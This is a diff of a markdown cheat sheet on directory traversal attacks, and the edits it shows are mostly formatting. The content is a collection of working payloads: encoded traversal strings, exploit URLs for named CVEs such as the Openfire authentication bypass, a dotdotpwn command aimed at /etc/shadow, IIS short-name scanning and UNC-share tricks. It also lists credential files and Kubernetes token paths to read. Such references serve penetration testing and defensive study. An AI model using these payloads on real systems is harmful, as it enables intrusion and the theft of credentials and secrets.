@@ -15,7 +15,7 @@
     * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
 * [Exploit](#exploit)
     * [UNC Share](#unc-share)
-    * [ASPNET Cookieless](#aspnet-cookieless)
+    * [ASPNET Cookieless](#asp-net-cookieless)
     * [IIS Short Name](#iis-short-name)
     * [Java URL Protocol](#java-url-protocol)
 * [Path Traversal](#path-traversal)
@@ -24,14 +24,13 @@
 * [Labs](#labs)
 * [References](#references)
 
-
 ## Tools
 
-- [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
+* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
+
     ```powershell
     perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
     ```
-
 
 ## Methodology
 
@@ -48,7 +47,6 @@ We can use the `..` characters to access the parent directory, the following str
 %uff0e%uff0e%u2216
 ```
 
-
 ### URL Encoding
 
 | Character | Encoded |
@@ -57,13 +55,11 @@ We can use the `..` characters to access the parent directory, the following str
 | `/` | `%2f` |
 | `\` | `%5c` |
 
-
 **Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion
 
 ```ps1
 {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
 ```
-
 
 ### Double URL Encoding
 
@@ -75,14 +71,12 @@ Double URL encoding is the process of applying URL encoding twice to a string. I
 | `/` | `%252f` |
 | `\` | `%255c` |
 
-
 **Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)
 
 ```ps1
 {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
 {{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
 ```
-
 
 ### Unicode Encoding
 
@@ -92,13 +86,11 @@ Double URL encoding is the process of applying URL encoding twice to a string. I
 | `/` | `%u2215` |
 | `\` | `%u2216` |
 
-
 **Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)
 
 ```js
 {{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
 ```
-
 
 ### Overlong UTF-8 Unicode Encoding
 
@@ -109,7 +101,6 @@ The UTF-8 standard mandates that each codepoint is encoded using the minimum num
 | `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
 | `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
 | `\` | `%c0%5c`, `%c0%80%5c` |
-
 
 ### Mangled Path
 
@@ -125,7 +116,6 @@ Sometimes you encounter a WAF which remove the `../` characters from the strings
 ```ps1
 {{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
 ```
-
 
 ### NULL Bytes
 
@@ -143,7 +133,6 @@ A null byte (`%00`), also known as a null character, is a special control charac
 {{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
 ```
 
-
 ### Reverse Proxy URL Implementation
 
 Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.
@@ -160,11 +149,9 @@ A configuration error between NGINX and a backend Tomcat server leads to a path 
 {{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
 ```
 
-
 ## Exploit
 
 These exploits affect mechanism linked to specific technologies.
-
 
 ### UNC Share
 
@@ -178,13 +165,11 @@ An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a softw
 
 Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.
 
-
 ### ASP NET Cookieless
 
 When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.
 
-For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID. 
-
+For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID.
 
 | .NET Version   | URI                        |
 | -------------- | -------------------------- |
@@ -193,10 +178,10 @@ For example, a typical URL might be transformed from: `http://example.com/page.a
 | V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
 | V2.0+          | ...                        |
 
-
 We can use this behavior to bypass filtered URLs.
 
 * If your application is in the main folder
+
     ```ps1
     /(S(X))/
     /(Y(Z))/
@@ -206,6 +191,7 @@ We can use this behavior to bypass filtered URLs.
     ```
 
 * If your application is in a subfolder
+
     ```ps1
     /MyApp/(S(X))/
     /admin/(S(X))/main.aspx
@@ -219,22 +205,22 @@ We can use this behavior to bypass filtered URLs.
 | CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |
 | -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |
 
-
 ### IIS Short Name
 
 The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.
 
 * [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
+
     ```ps1
     java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
     java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
     ```
 
 * [bitquark/shortscan](https://github.com/bitquark/shortscan)
+
     ```ps1
     shortscan http://example.org/
     ```
-
 
 ### Java URL Protocol
 
@@ -245,12 +231,12 @@ url:file:///etc/passwd
 url:http://127.0.0.1:8080
 ```
 
-
 ## Path Traversal
 
 ### Linux Files
 
 * Operating System and Informations
+
     ```powershell
     /etc/issue
     /etc/group
@@ -258,7 +244,8 @@ url:http://127.0.0.1:8080
     /etc/motd
     ```
 
-* Processes 
+* Processes
+
     ```ps1
     /proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor
     /proc/self/environ
@@ -269,6 +256,7 @@ url:http://127.0.0.1:8080
     ```
 
 * Network
+
     ```ps1
     /proc/net/arp
     /proc/net/route
@@ -277,12 +265,14 @@ url:http://127.0.0.1:8080
     ```
 
 * Current Path
+
     ```ps1
     /proc/self/cwd/index.php
     /proc/self/cwd/main.py
     ```
 
 * Indexing
+
     ```ps1
     /var/lib/mlocate/mlocate.db
     /var/lib/plocate/plocate.db
@@ -290,6 +280,7 @@ url:http://127.0.0.1:8080
     ```
 
 * Credentials and history
+
     ```ps1
     /etc/passwd
     /etc/shadow
@@ -299,13 +290,13 @@ url:http://127.0.0.1:8080
     ```
 
 * Kubernetes
+
     ```ps1
     /run/secrets/kubernetes.io/serviceaccount/token
     /run/secrets/kubernetes.io/serviceaccount/namespace
     /run/secrets/kubernetes.io/serviceaccount/certificate
     /var/run/secrets/kubernetes.io/serviceaccount
     ```
-
 
 ### Windows Files
 
@@ -342,7 +333,6 @@ c:/windows/repair/sam
 c:/windows/repair/system
 ```
 
-
 ## Labs
 
 * [PortSwigger - File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
@@ -352,15 +342,14 @@ c:/windows/repair/system
 * [PortSwigger - File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
 * [PortSwigger - File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
 
-
 ## References
 
-- [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://twitter.com/irsdl/status/1640390106312835072)
-- [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
-- [Directory traversal - Portswigger - March 30, 2019](https://portswigger.net/web-security/file-path-traversal)
-- [Directory traversal attack - Wikipedia - August 5,  2024](https://en.wikipedia.org/wiki/Directory_traversal_attack)
-- [EP 057 | Proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - TheLaluka - November 30, 2023](https://youtu.be/YlZGJ28By8U)
-- [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos - 19 June 2018](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
-- [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
-- [Path Traversal Cheat Sheet: Windows - @HollyGraceful - May 17, 2015](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
-- [Understand How the ASP.NET Cookieless Feature Works - Microsoft Documentation - June 24, 2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))
+* [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://twitter.com/irsdl/status/1640390106312835072)
+* [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
+* [Directory traversal - Portswigger - March 30, 2019](https://portswigger.net/web-security/file-path-traversal)
+* [Directory traversal attack - Wikipedia - August 5,  2024](https://en.wikipedia.org/wiki/Directory_traversal_attack)
+* [EP 057 | Proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - TheLaluka - November 30, 2023](https://youtu.be/YlZGJ28By8U)
+* [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos - 19 June 2018](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
+* [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
+* [Path Traversal Cheat Sheet: Windows - @HollyGraceful - May 17, 2015](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
+* [Understand How the ASP.NET Cookieless Feature Works - Microsoft Documentation - June 24, 2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))
